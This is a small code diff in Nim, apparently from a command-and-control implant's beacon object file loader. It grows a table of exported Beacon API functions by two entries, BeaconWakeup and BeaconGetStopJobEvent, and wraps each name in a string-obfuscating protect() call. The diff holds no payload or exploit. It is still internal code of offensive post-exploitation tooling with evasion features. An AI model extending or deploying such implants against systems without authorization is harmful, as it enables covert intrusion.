@@ -415,7 +415,7 @@ proc BeaconGetStopJobEvent(): HANDLE {.stdcall.} =
     # Return stop event
     discard
 
-var beaconApiAddresses*: array[32, tuple[name: string, address: PVOID]] = [
+var beaconApiAddresses*: array[34, tuple[name: string, address: PVOID]] = [
     (protect("BeaconDataParse"), BeaconDataParse),
     (protect("BeaconDataPtr"), BeaconDataPtr),
     (protect("BeaconDataInt"), BeaconDataInt),
@@ -444,6 +444,8 @@ var beaconApiAddresses*: array[32, tuple[name: string, address: PVOID]] = [
     (protect("BeaconAddValue"), BeaconAddValue),
     (protect("BeaconGetValue"), BeaconGetValue),
     (protect("BeaconRemoveValue"), BeaconRemoveValue),
+    (protect("BeaconWakeup"), BeaconWakeup),
+    (protect("BeaconGetStopJobEvent"), BeaconGetStopJobEvent),
     (protect("LoadLibraryA"), LoadLibraryA),
     (protect("GetProcAddress"), GetProcAddress),
     (protect("GetModuleHandleA"), GetModuleHandleA),
